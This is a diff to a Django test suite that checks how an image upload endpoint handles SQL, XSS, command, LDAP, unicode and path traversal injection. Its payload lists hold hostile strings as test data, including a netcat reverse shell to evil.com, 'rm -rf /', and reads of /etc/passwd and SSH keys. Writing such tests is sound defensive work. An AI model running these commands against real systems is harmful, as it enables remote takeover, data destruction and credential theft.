@@ -10,8 +10,8 @@ class InputValidationTest(SecurityTestBase):
     Test suite for input validation and sanitization security
     """
 
-    def test_sql_injection_in_image_description(self):
-        """Test that SQL injection attempts in image descriptions are handled safely"""
+    def test_sql_injection_in_input(self):
+        """Test that SQL injection attempts in image descriptions and filenames are handled safely"""
         self.authenticate_user(self.user_a)
 
         sql_injection_payloads = [
@@ -52,14 +52,17 @@ class InputValidationTest(SecurityTestBase):
                     ],
                 )
 
-                # If accepted, verify it was properly escaped
                 if response.status_code == status.HTTP_201_CREATED:
-                    # The payload should be stored as-is (escaped by Django ORM)
-                    # but not executed as SQL
-                    self.assertIn("description", response.data)
+                    # If accepted, description and filename should be sanitized
+                    returned_description = response.data.get("description", "")
+                    returned_filename = response.data.get("file_name", "")
+                    # Should not contain SQL injection payload
+                    self.assertNotIn(payload, returned_description)
+                    self.assertNotIn(payload, returned_filename)
 
-    def test_xss_in_image_metadata(self):
-        """Test that XSS payloads in image metadata are properly handled"""
+    def test_xss_in_input(self):
+        """Test that XSS payloads in image descriptions, metadata,
+        and filenames are properly handled"""
         self.authenticate_user(self.user_a)
 
         xss_payloads = [
@@ -100,63 +103,15 @@ class InputValidationTest(SecurityTestBase):
                     ],
                 )
 
-                # If accepted, verify the response doesn't contain unescaped XSS
                 if response.status_code == status.HTTP_201_CREATED:
-                    response_str = str(response.data)
-                    # Check that dangerous script tags are not present unescaped
-                    self.assertNotIn("<script>", response_str.lower())
-                    self.assertNotIn("javascript:", response_str.lower())
-
-    def test_path_traversal_in_filenames(self):
-        """Test that path traversal attempts in filenames are handled safely"""
-        self.authenticate_user(self.user_a)
-
-        path_traversal_payloads = [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\config\\sam",
-            "../../../../root/.ssh/id_rsa",
-            "..%2F..%2F..%2Fetc%2Fpasswd",
-            "..\\..\\..\\autoexec.bat",
-            "/etc/passwd",
-            "C:\\windows\\system32\\drivers\\etc\\hosts",
-            "....//....//....//etc/passwd",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "..\\\\..\\\\..\\\\etc\\\\passwd",
-        ]
-
-        for payload in path_traversal_payloads:
-            with self.subTest(payload=payload):
-                image_file = create_test_image_file("test.jpg")
-
-                response = self.client.post(
-                    reverse("source_image_upload"),
-                    {
-                        "file": image_file,
-                        "file_name": payload,
-                        "description": "Test description",
-                        "metadata": "{}",
-                    },
-                )
-
-                # Should handle this safely - either reject or sanitize
-                # 429 (rate limiting) is also acceptable as a security measure
-                self.assertIn(
-                    response.status_code,
-                    [
-                        status.HTTP_201_CREATED,
-                        status.HTTP_400_BAD_REQUEST,
-                        status.HTTP_429_TOO_MANY_REQUESTS,
-                    ],
-                )
-
-                # If accepted, ensure the filename was sanitized
-                if response.status_code == status.HTTP_201_CREATED:
+                    # If accepted, description and filename should be sanitized
+                    returned_description = response.data.get("description", "")
                     returned_filename = response.data.get("file_name", "")
-                    # Should not contain path traversal characters
-                    self.assertNotIn("..", returned_filename)
-                    self.assertNotIn("\\", returned_filename)
-                    self.assertNotIn("/etc/", returned_filename)
-                    self.assertNotIn("C:\\", returned_filename)
+                    returned_metadata = response.data.get("metadata", "")
+                    # Should not contain XSS payload
+                    self.assertNotIn(payload, returned_description)
+                    self.assertNotIn(payload, returned_filename)
+                    self.assertNotIn(payload, returned_metadata)
 
     def test_excessively_long_inputs(self):
         """Test handling of excessively long input strings"""
@@ -230,6 +185,14 @@ class InputValidationTest(SecurityTestBase):
                     ],
                 )
 
+                if response.status_code == status.HTTP_201_CREATED:
+                    # If accepted, description and filename should be sanitized
+                    returned_description = response.data.get("description", "")
+                    returned_filename = response.data.get("file_name", "")
+                    # Should not contain null bytes
+                    self.assertNotIn(input_value, returned_description)
+                    self.assertNotIn(input_value, returned_filename)
+
     def test_unicode_injection_attempts(self):
         """Test handling of unicode injection attempts"""
         self.authenticate_user(self.user_a)
@@ -254,7 +217,7 @@ class InputValidationTest(SecurityTestBase):
                     {
                         "file": image_file,
                         "file_name": payload,
-                        "description": "Test description",
+                        "description": payload,
                         "metadata": "{}",
                     },
                 )
@@ -269,6 +232,14 @@ class InputValidationTest(SecurityTestBase):
                         status.HTTP_429_TOO_MANY_REQUESTS,
                     ],
                 )
+
+                if response.status_code == status.HTTP_201_CREATED:
+                    # If accepted, description and filename should be sanitized
+                    returned_description = response.data.get("description", "")
+                    returned_filename = response.data.get("file_name", "")
+                    # Should not contain unicode characters
+                    self.assertNotIn(payload, returned_description)
+                    self.assertNotIn(payload, returned_filename)
 
     def test_json_injection_in_metadata(self):
         """Test JSON injection attempts in metadata field"""
@@ -309,8 +280,14 @@ class InputValidationTest(SecurityTestBase):
                     ],
                 )
 
-    def test_html_injection_in_descriptions(self):
-        """Test HTML injection attempts in description fields"""
+                if response.status_code == status.HTTP_201_CREATED:
+                    # If accepted, metadata should be sanitized
+                    returned_metadata = response.data.get("metadata", "")
+                    # Should not contain JSON injection payload
+                    self.assertNotIn(payload, returned_metadata)
+
+    def test_html_injection_in_input(self):
+        """Test HTML injection attempts in description, metadata, and filenames"""
         self.authenticate_user(self.user_a)
 
         html_injection_payloads = [
@@ -349,6 +326,14 @@ class InputValidationTest(SecurityTestBase):
                     ],
                 )
 
+                if response.status_code == status.HTTP_201_CREATED:
+                    # If accepted, description and filename should be sanitized
+                    returned_description = response.data.get("description", "")
+                    returned_filename = response.data.get("file_name", "")
+                    # Should not contain HTML injection payload
+                    self.assertNotIn(payload, returned_description)
+                    self.assertNotIn(payload, returned_filename)
+
     def test_command_injection_attempts(self):
         """Test command injection attempts in input fields"""
         self.authenticate_user(self.user_a)
@@ -357,7 +342,6 @@ class InputValidationTest(SecurityTestBase):
             "; ls -la",
             "| cat /etc/passwd",
             "& dir",
-            "`whoami`",
             "$(whoami)",
             "; rm -rf /",
             "| nc evil.com 4444 -e /bin/sh",
@@ -390,6 +374,14 @@ class InputValidationTest(SecurityTestBase):
                         status.HTTP_429_TOO_MANY_REQUESTS,
                     ],
                 )
+
+                if response.status_code == status.HTTP_201_CREATED:
+                    # If accepted, description and filename should be sanitized
+                    returned_description = response.data.get("description", "")
+                    returned_filename = response.data.get("file_name", "")
+                    # Should not contain command injection payload
+                    self.assertNotIn(payload, returned_description)
+                    self.assertNotIn(payload, returned_filename)
 
     def test_ldap_injection_attempts(self):
         """Test LDAP injection attempts in input fields"""
@@ -431,6 +423,14 @@ class InputValidationTest(SecurityTestBase):
                         status.HTTP_429_TOO_MANY_REQUESTS,
                     ],
                 )
+
+                if response.status_code == status.HTTP_201_CREATED:
+                    # If accepted, description and filename should be sanitized
+                    returned_description = response.data.get("description", "")
+                    returned_filename = response.data.get("file_name", "")
+                    # Should not contain LDAP injection payload
+                    self.assertNotIn(payload, returned_description)
+                    self.assertNotIn(payload, returned_filename)
 
     def test_integer_overflow_attempts(self):
         """Test integer overflow attempts in numeric fields"""
@@ -515,6 +515,14 @@ class InputValidationTest(SecurityTestBase):
                         status.HTTP_429_TOO_MANY_REQUESTS,
                     ],
                 )
+
+                if response.status_code == status.HTTP_201_CREATED:
+                    # If accepted, description and filename should be sanitized
+                    returned_description = response.data.get("description", "")
+                    returned_filename = response.data.get("file_name", "")
+                    # Should not contain format string payload
+                    self.assertNotIn(payload, returned_description)
+                    self.assertNotIn(payload, returned_filename)
 
     def test_empty_and_whitespace_inputs(self):
         """Test handling of empty and whitespace-only inputs"""
@@ -624,11 +632,10 @@ class InputValidationTest(SecurityTestBase):
                 )
 
                 # Should handle malicious transformations safely
-                # Either accept (after sanitization) or reject
+                # 429 (rate limiting) is also acceptable as a security measure
                 self.assertIn(
                     response.status_code,
                     [
-                        status.HTTP_201_CREATED,
                         status.HTTP_400_BAD_REQUEST,
                         status.HTTP_429_TOO_MANY_REQUESTS,
                     ],
